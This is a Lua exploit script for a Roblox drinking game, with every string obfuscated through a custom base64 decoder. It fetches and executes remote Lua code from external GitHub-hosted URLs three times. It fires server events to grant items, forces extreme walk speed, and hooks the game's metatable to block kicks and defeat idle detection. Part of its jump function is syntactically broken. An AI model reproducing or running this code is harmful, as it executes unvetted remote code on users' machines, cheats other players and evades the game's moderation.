local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
function cSNMVTuJcErMYcmPXAgHLJPuzDudoVRRRkXfK(data) m=string.sub(data, 0, 55) data=data:gsub(m,'')

data = string.gsub(data, '[^'..b..'=]', '') return (data:gsub('.', function(x) if (x == '=') then return '' end local r,f='',(b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end return r; end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) if (#x ~= 8) then return '' end local c=0 for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end return string.char(c) end)) end


 


loadstring(game:HttpGet(cSNMVTuJcErMYcmPXAgHLJPuzDudoVRRRkXfK('sKIXZbcjxmvUrtErJSQplGFKSmOibTDfREyVukaGaetGuJooclwIPrUaHR0cHM6Ly9zb25pYzk5OC5naXRodWIuaW8vc29uaWNodWIvU2hpdC9IYWNrZXJNYW5zaW9uLmx1YQ==')))()
function autodrink()
  game.ReplicatedStorage.RemoteEvents.DrinkEvent:FireServer(cSNMVTuJcErMYcmPXAgHLJPuzDudoVRRRkXfK('PVIknPwXkvwJlAysldXmuKNituypTZPDTMKDYAyVcHsBpxpxyzsdNcjU3RhcnRlciBEcmluaw=='))
  game.ReplicatedStorage.RemoteEvents.DrinkEvent:FireServer(cSNMVTuJcErMYcmPXAgHLJPuzDudoVRRRkXfK('PnHeXnIoSHZaHSSZRWKZfEkUREQnuipVWBFLPZWvJVRMBehsGYgLClCU2Vjb25kIERyaW5r'))
  game.ReplicatedStorage.RemoteEvents.DrinkEvent:FireServer(cSNMVTuJcErMYcmPXAgHLJPuzDudoVRRRkXfK('UiUBoGoqqvYLelmBXyjOnvryUuSIeGoOdxTQaUsmLiqAeOAAPnBOzIBVGhpcmQgRHJpbms='))
  game.ReplicatedStorage.RemoteEvents.DrinkEvent:FireServer(cSNMVTuJcErMYcmPXAgHLJPuzDudoVRRRkXfK('GcfdMsKamBEYrzmXCFSmnPRWFBWQiPmXrHpBZTmkikPlDKzgoQZSYwpRm91cnRoIERyaW5r'))
  game.ReplicatedStorage.RemoteEvents.DrinkEvent:FireServer(cSNMVTuJcErMYcmPXAgHLJPuzDudoVRRRkXfK('LQKVEHuZejduzghaPNJvVaccPtRKMElAXmysWnueqyMimSEKcmIsMIrRmlmdGggRHJpbms='))
  game.ReplicatedStorage.RemoteEvents.DrinkEvent:FireServer(cSNMVTuJcErMYcmPXAgHLJPuzDudoVRRRkXfK('mIxFyFCSrWSCUENQCMAlrmqBrYqqqWQekdoIlYibBFeuRtbucVKcavrU2l4dGggRHJpbms='))
  game.ReplicatedStorage.RemoteEvents.DrinkEvent:FireServer(cSNMVTuJcErMYcmPXAgHLJPuzDudoVRRRkXfK('ErBxbpGQInHaVcMvasSRXGcgGjJfzHjJMdMGOkCxPhlRWBUAJrZrrKyU2V2ZW50aCBEcmluaw=='))
  game.ReplicatedStorage.RemoteEvents.DrinkEvent:FireServer(cSNMVTuJcErMYcmPXAgHLJPuzDudoVRRRkXfK('pzZpHdRBDRhiFqDVIOCQjxcVNulvMSEByhcAsruuyBfJehbubXNTancRWlnaHRoIERyaW5r'))
  game.ReplicatedStorage.RemoteEvents.DrinkEvent:FireServer(cSNMVTuJcErMYcmPXAgHLJPuzDudoVRRRkXfK('ZmNJENAPGYuuEcnLpjFXGcPrjKnAxnjSjVcfoavznyTqaLUETqiawgiTmludGggRHJpbms='))
  game.ReplicatedStorage.RemoteEvents.DrinkEvent:FireServer(cSNMVTuJcErMYcmPXAgHLJPuzDudoVRRRkXfK('buUzrYQcTOdlMCXChIVFCGcQqkiiMgJHIPIqFFotoyCaIgFgbpWaPqOQXRvbWljIERyaW5r'))
  game.ReplicatedStorage.RemoteEvents.DrinkEvent:FireServer(cSNMVTuJcErMYcmPXAgHLJPuzDudoVRRRkXfK('RUNvfrqLyoBrZWOxZSClpbRqTlDsBjyBZIQRqlnwTddCZCKBhsboTPIT21lZ2EgQnVycCBKdWljZQ=='))
  game.ReplicatedStorage.RemoteEvents.DrinkEvent:FireServer(cSNMVTuJcErMYcmPXAgHLJPuzDudoVRRRkXfK('MDkrrCUFOhFNjZSUtoDKouqdbPWPFSwlzumLBxVCubWCuKZHZZVXHvjVGh1bmRlciBGaXp6'))
  game.ReplicatedStorage.RemoteEvents.DrinkEvent:FireServer(cSNMVTuJcErMYcmPXAgHLJPuzDudoVRRRkXfK('ZsXvtoGBXYpnxMVaIjSERQVFCnVLeYfdFdlOVTxJIHupIdxTfQGIzhIR2FybGljIEp1aWNl'))
end

function AutoCollectGems()
for i,v in pairs(workspace.Diamonds:GetChildren()) do
v.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
end
end

function autoprestige()
  game.ReplicatedStorage.RemoteEvents.PrestigeEvent:FireServer()
end

function equipdrink()
  loadstring(game:HttpGet(cSNMVTuJcErMYcmPXAgHLJPuzDudoVRRRkXfK('FZhJEaeFmCambaEbNFhVySWeOAGKufpYXYNkuuzGyTWjJBKwONMjzNBaHR0cHM6Ly9zb25pYzk5OC5naXRodWIuaW8vc29uaWNodWIvU2hpdC9BdXRvRXF1aXBEcmluay5sdWE=')))()
end

function speed()
local mt = getrawmetatable(game)
setreadonly(mt, false)
local old = mt.__newindex

    mt.__newindex = newcclosure(function(a, b, c)
    if tostring(a) == cSNMVTuJcErMYcmPXAgHLJPuzDudoVRRRkXfK('GGOxhjeJrPwUdhUGAXopMPzWsBNZPlNievcKUsYwsCkomccTwGkHQytSHVtYW5vaWQ=') and tostring(b) == cSNMVTuJcErMYcmPXAgHLJPuzDudoVRRRkXfK('SNMljHAaNLqmgETmOesXUgYWcRIAwgFRLPwXRlxenIGeDtCBIJdPOhaV2Fsa1NwZWVk') then
        return old(a, b, 1000)
    end
    return old(a,b,c)
    end)
  game:GetService(cSNMVTuJcErMYcmPXAgHLJPuzDudoVRRRkXfK('ZpNXixEUEbfXSWRVMDkKjdprLFfwtEPdZgNjFccNUxLqKOcfNmbjaknUnVuU2VydmljZQ==')).Stepped:Connect(function()
     game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 1000 
  end)
end

function jump()
  game:GetService(cSNMVTuJcErMYcmPXAgHLJPuzDudoVRRRkXfK('UBmRYArfvvleyDajadDvccjKiateiNIscaIrBpzGLDybBBIeAiqPDYHVXNlcklucHV0U2VydmljZQ==')).jumpRequest:Connect(function()
     game:GetServicecSNMVTuJcErMYcmPXAgHLJPuzDudoVRRRkXfK('jKsXXtdowcOYFfOyjcPPbTUszoDlIKCyJStfYzmpIViARAixhnYuIggUGxheWVycw==').LocalPlayer.Character:FindFirstChildOfClasscSNMVTuJcErMYcmPXAgHLJPuzDudoVRRRkXfK('nFHpPSFAuHTHqXLLSCoMpZCyczLdoEhcQFFKQbXgHhriooeSYBaGqPaSHVtYW5vaWQ='):ChangeState(cSNMVTuJcErMYcmPXAgHLJPuzDudoVRRRkXfK('JmslVIncVEVhzfWxFlqdJpATRxThDbefspoPQhIzAUHIKsfOKTpItPlSnVtcGluZw=='))
end)
end

function rejoin()
  game:GetService(cSNMVTuJcErMYcmPXAgHLJPuzDudoVRRRkXfK('IoulWkTicEkNoipnvHBpQXCbUpEADQdfyemDSagsadAseXxSHKJkajZVGVsZXBvcnRTZXJ2aWNl')):Teleport(game.PlaceId)
end

function infyield()
  loadstring(game:HttpGet(cSNMVTuJcErMYcmPXAgHLJPuzDudoVRRRkXfK('kYtDCgtUorAFoJhwWqDoXxTQdvXZbFpUrfpKwUYVaauEzzuerpiXxaBaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0VkZ2VJWS9pbmZpbml0ZXlpZWxkL21hc3Rlci9zb3VyY2U=')))()
end

for i,v in pairs(workspace.Clouds:GetChildren()) do
if v.Name == cSNMVTuJcErMYcmPXAgHLJPuzDudoVRRRkXfK('FvkRmuHEwFCbBARQSpTDYyYVQTAqcFrycicwUgPLHYCADTFVwHRmlEWQ2xvdWQ=') then
v.CanCollide = true
end
end

function AntiAfk()
local bb=game:GetService(cSNMVTuJcErMYcmPXAgHLJPuzDudoVRRRkXfK('DriQtrABpPjzzoJscymZIyNzdIWRqjQZfHtWwpIpZmChljUxORdfhObVmlydHVhbFVzZXI='))
game:GetService(cSNMVTuJcErMYcmPXAgHLJPuzDudoVRRRkXfK('NuOwEovLiElVEkWuulNFxkAhuLxRziseqDPgwjAReJTkpPTJDkTaQTBUGxheWVycw==')).LocalPlayer.Idled:Connect(function()
bb:CaptureController()
bb:ClickButton2(Vector2.new())
end)
end
function AntiKick()
local mt = getrawmetatable(game)
        local old = mt.__namecall
        local protect = newcclosure or protect_function
 
        setreadonly(mt, false)
        mt.__namecall = protect(function(self, ...)
            local method = getnamecallmethod()
            if method == cSNMVTuJcErMYcmPXAgHLJPuzDudoVRRRkXfK('wBzfprKZbXyyxEAlvpuNpNyGVSMppYatQanHxhyqIiZmFdSTXVEYLtHS2ljaw==') then
                wait(9e9)
                return
            end
            return old(self, ...)
        end)
        hookfunction(game.Players.LocalPlayer.Kick,protect(function() wait(9e9) end))
end    
